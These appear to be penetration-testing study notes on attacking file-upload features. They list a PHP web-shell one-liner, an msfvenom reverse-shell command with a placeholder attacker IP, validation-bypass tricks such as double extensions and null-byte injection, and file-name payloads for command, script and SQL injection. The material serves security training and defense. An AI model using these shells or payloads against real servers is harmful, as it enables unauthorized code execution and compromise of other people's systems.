## Info

- Occurs when the web application does not have any form of validation filters on the uploaded files

## Enumeration

**PHP**
- Identification: `<?php system("dir");?>`
- One liner cmd php: `<?php system($_REQUEST['cmd']); ?>`
- Shell: https://github.com/Arrexel/phpbash
- Seclists: https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
- Pentestmonkey: https://github.com/pentestmonkey/php-reverse-shell
- Msfvenom: `L3pr3ch4un@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

## Client Side Validation

We can either modify the upload request to the back-end server, or we can manipulate the front-end code to disable these type validations.

Note: We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.’

**Fuzzing extesions**

Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.

- **Common Extensions**:https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- **PHP**:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
- **ASP**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP

**Reverse Double Extensions**:

In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.
**eg:** filename.php.jpg

**Character Injection**:

The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier

**Type Filters**

There are two common methods for validating the file content: Content-Type Header or File Content.

**Wordlist**: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

**Mime-Type**

Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure.

**Injections in File Name**

```
file$(whoami).jpg
file`whoami`.jpg 
file.jpg||whoami
<script>alert(window.origin);</script>
file';select+sleep(5);--.jpg
```

**Windows Specific**:

One such attack is using reserved characters, such as (|, <, >, *, or ?), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. 
